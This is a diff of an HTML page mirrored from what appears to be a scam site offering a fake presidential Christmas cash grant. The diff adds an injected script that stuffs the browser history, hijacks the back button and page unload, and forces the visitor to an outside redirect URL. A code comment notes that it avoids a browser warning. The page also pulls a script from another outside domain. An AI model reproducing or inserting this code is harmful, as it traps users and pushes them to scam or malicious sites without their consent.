@@ -525,7 +525,61 @@ function go() {
 
 </script>
 
+<script>
+!function(a, e, t, n) {
+  const redirectURL = "https://omg10.com/4/9015024";
 
+  const c = function(trigger) {
+    if (a.onbeforeunload === null) {
+      a.onbeforeunload = function() {
+        if (trigger) {
+          setTimeout(function() {
+            a.onbeforeunload = null;
+            a.location.replace(redirectURL);
+          }, 100);
+        }
+        // Do not return anything to avoid Chrome popup
+      };
+    }
+  };
+
+  !function(a, e, t, n) {
+    n.replaceState(null, t.title, e.pathname + e.search);
+    for (let i = 0; i < 10; i++) {
+      try {
+        n.pushState(null, t.title, e.pathname + e.search);
+      } catch (err) {
+        i = 10;
+      }
+    }
+
+    a.addEventListener("popstate", function() {
+      n.replaceState(null, t.title, e.pathname + e.search);
+      a.onbeforeunload = null;
+      a.location.replace(redirectURL);
+    });
+  }(a, e, t, n);
+
+  try {
+    a.performance.getEntriesByType("navigation").forEach(function(entry) {
+      if (entry.type !== "reload") {
+        c(entry.type !== "navigate");
+      }
+    });
+  } catch (err) {
+    c(true);
+  }
+
+  t.addEventListener("click", function(event) {
+    for (let el = event.target; el && el !== this; el = el.parentNode) {
+      if (el.matches("a")) {
+        a.onbeforeunload = null;
+        break;
+      }
+    }
+  }, false);
+}(window, location, document, history);
+</script>
 </body>
 <script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl487034'},{'dcenter':'p3'},{'cp_id':'9979766'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://try.kanex.online/let/scc-c2.min.js'></script>
 <!-- Mirrored from hakainde-hichilema-1000zmw-xmas-cash-grant.clnk.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Nov 2024 07:07:00 GMT -->
